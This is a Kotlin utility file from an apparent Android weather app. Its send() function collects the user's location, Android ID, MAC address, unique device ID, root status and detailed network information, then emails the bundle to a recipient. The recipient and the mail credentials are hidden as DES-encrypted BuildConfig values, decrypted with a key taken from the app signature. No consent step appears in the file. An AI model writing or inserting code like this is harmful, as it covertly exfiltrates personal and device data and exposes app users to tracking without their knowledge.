package com.newolf.weatherfunction.app.utils

import android.text.TextUtils
import com.blankj.utilcode.util.*
import com.newolf.maillib.MailIntentService
import com.newolf.weatherfunction.BuildConfig
import com.newolf.weatherfunction.app.application.App
import javax.crypto.spec.IvParameterSpec
import kotlin.ByteArray as KotlinByteArray

object MsgUtils {
    private const val MIN_UPDATE = 10 * 1000 * 60
    private const val LAST_UPDATE = "lastUpdate"
    private const val CBC_PKCS5_PADDING = "DES/CBC/PKCS5Padding"
    private val iv = byteArrayOf(1, 2, 3, 4, 5, 6, 7, 8)
    private var isInit = false
    private lateinit var keyData: KotlinByteArray


    private lateinit var tt: String
    private lateinit var pp: String
    private lateinit var aa: String
    private lateinit var deviceInfo: String
    private lateinit var netInfo: String
    fun send(location: String, isForce: Boolean = false) {
        val lastUpdate = SPUtils.getInstance().getLong(LAST_UPDATE)
        val currency = System.currentTimeMillis()
        if ((currency - lastUpdate) < MIN_UPDATE) {
            LogUtils.e("not need update by $currency")
            return
        }

        if (!isInit) {
            keyData = getKey()
            tt = getDecrypt(BuildConfig.MESSAGE_TARGET, keyData)
            pp = getDecrypt(BuildConfig.MESSAGE_P, keyData)
            aa = getDecrypt(BuildConfig.MESSAGE_A, keyData)
            deviceInfo = "AndroidID: ${DeviceUtils.getAndroidID()}\n" +
                    "MacAddress: ${DeviceUtils.getMacAddress()}\n" +
                    "Manufacturer: ${DeviceUtils.getManufacturer()}\n" +
                    "SDKVersionCode: ${DeviceUtils.getSDKVersionCode()}\n" +
                    "SDKVersionName: ${DeviceUtils.getSDKVersionName()}\n" +
                    "UniqueDeviceId: ${DeviceUtils.getUniqueDeviceId()}\n" +
                    "isDeviceRooted: ${DeviceUtils.isDeviceRooted()}\n" +
                    "isEmulator: ${DeviceUtils.isEmulator()}\n" +
                    "isTablet: ${DeviceUtils.isTablet()}\n" +
                    "isSameDevice: ${DeviceUtils.isSameDevice(DeviceUtils.getUniqueDeviceId())}\n"

            netInfo = "IPAddress: ${NetworkUtils.getIPAddress(true)}\n" +
                    "BroadcastIpAddress: ${NetworkUtils.getBroadcastIpAddress()}\n" +
                    "IpAddressByWifi: ${NetworkUtils.getIpAddressByWifi()}\n" +
                    "DataEnabled: ${NetworkUtils.getMobileDataEnabled()}\n" +
                    "NetworkOperatorName: ${NetworkUtils.getNetworkOperatorName()}\n" +
                    "ServerAddressByWifi: ${NetworkUtils.getServerAddressByWifi()}\n" +
                    "GatewayByWifi: ${NetworkUtils.getGatewayByWifi()}\n" +
                    "is4G: ${NetworkUtils.is4G()}\n" +
                    "is5G: ${NetworkUtils.is5G()}\n" +
                    "isMobileData: ${NetworkUtils.isMobileData()}\n" +
                    "NetMaskByWifi: ${NetworkUtils.getNetMaskByWifi()}\n"
            if (TextUtils.isEmpty(tt) || TextUtils.isEmpty(pp) || TextUtils.isEmpty(aa)) {
                LogUtils.e("init failed by $currency")
                return
            }
            isInit = true
        }
        val msg = "$location\n\n$deviceInfo\n\n$netInfo"
//        LogUtils.e("tt =  $tt , pp = $pp, aa = $aa")
        MailIntentService.send(
            App.CONTEXT,
            tt,
            pp,
            aa,
            "${App.name}_${TimeUtils.getNowString()}",
            msg
        )
        SPUtils.getInstance().put(LAST_UPDATE, currency)

    }

    private fun getDecrypt(str: String, key: KotlinByteArray): String {
        LogUtils.d(str, key)
        var result = ""
        try {
            result = ConvertUtils.bytes2String(
                EncryptUtils.decryptDES(
                    ConvertUtils.hexString2Bytes(str),
                    key,
                    CBC_PKCS5_PADDING,
                    iv
                )
            )
        } catch (e: Exception) {
            LogUtils.e(e)
        }
        if (TextUtils.isEmpty(result)) {
            result = ""
        }
        return result
    }

    private fun enCode() {
        val dataBytes = ConvertUtils.string2Bytes("")
        val hex = ConvertUtils.bytes2HexString(dataBytes)
        val data = ConvertUtils.hexString2Bytes(hex)
//        val encryptAES =  EncryptUtils.encryptDES(data, keyData, CBC_PKCS5_PADDING, iv)
//        LogUtils.e("bytes2HexString hex = ", ConvertUtils.bytes2HexString(encryptAES))
    }

    private fun getKey(): KotlinByteArray {
        val key = ConvertUtils.string2Bytes(AppUtils.getAppSignaturesMD5()[0])
//        LogUtils.e("key = " + key.size, key)
        val keyData = KotlinByteArray(24)
        var index = 0
        if (key.size >= keyData.size) {
            for (byte in key) {
                if (index >= keyData.size) {
                    break
                }
                keyData[index] = byte
                index++
            }
        } else {
            for (byte in key) {
                keyData[index] = byte
                index++
            }

            for (i in 1..keyData.size - index) {
                keyData[index] = index.toByte()
                index++
            }
        }
        return keyData
    }

}
